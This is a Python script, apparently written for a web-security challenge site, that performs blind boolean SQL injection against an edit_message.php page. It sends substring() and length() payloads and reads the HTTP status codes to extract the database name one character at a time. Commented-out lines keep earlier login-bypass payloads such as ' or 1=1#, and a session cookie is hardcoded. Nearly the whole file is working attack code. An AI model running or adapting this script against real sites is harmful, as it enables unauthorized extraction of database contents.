import sys, requests, urllib.parse, string

printable = string.printable
url = 'https://challenge5a-trungvt12.000webhostapp.com/edit_message.php?id=6'
#payload = "' or 1=1#"; #302 -> redirect to index.php
#payload = "' or 1=2#"; #200 -> view password not match

#print(payload)
myheaders = {
    'Content-Type': 'application/x-www-form-urlencoded',
	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
	'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Accept-Encoding':'gzip, deflate'
}
#mydata = {'username': payload,'password': ''}
mycookies = {"PHPSESSID":"tubbn4apiudl5knvacd3pcqauv"}
#print(r"' or 1=1#");
#x = requests.post(url, data = mydata, cookies = mycookies, headers = myheaders, allow_redirects=False)
#print(x.status_code)
#f = open(r"C:\Users\AnhNH\Desktop\test2.html","w+", encoding="utf-8")
#f.write(x.text)
#f.close()

#print(x.text);


def getString(query, length):
	
	result = ''
	#query = "' or substring((select database()),"
	#length = 6
    # 1 to 6
	for k in range(1,length+1):
		# Ansii character 32 to 126
		
		#for i in range(32,127):
		for i in printable:
			#key = chr(i)
			key = urllib.parse.quote(i)
			payload = url + query + str(k) + ",1)='" + key + "'#"
			x = requests.post(payload, cookies = mycookies, headers = myheaders, allow_redirects=False)
			print(payload)
			print(x.status_code)
			if (x.status_code == 200):
				#print(key)
				result=result+key
				break
		
	#print(result)
	return result
	

def getLength(query):
	#query = "' or length((select database()))="
	# 1 to 100
	for i in range(1,101):	
		#print(key)
		payload = url + query + str(i) + "#"
		print(payload)
		x = requests.post(payload, cookies = mycookies, headers = myheaders, allow_redirects=False)
		print(x.status_code)
		if (x.status_code == 200):
			break
		#print(x.status_code)
	return i # -> 6

####### Get Length Table Schema ################################### -> 22
# AND length((select database()))=1# 	                                                                
# queryLengthTableSchema = " AND length((select database()))="	
# LengthTableSchema = getLength(queryLengthTableSchema)
# print("LengthTableSchema: ", LengthTableSchema)
###################################################################
####### Get Table Schema ########################################## -> id15831093_challenge5a
# AND substring((select database()),1,1)='a'#  
LengthTableSchema = 22                                                         
query = " AND substring((select database()),"
TableSchemaName = getString(query, LengthTableSchema)
print("TableSchemaName: ", TableSchemaName)
###################################################################

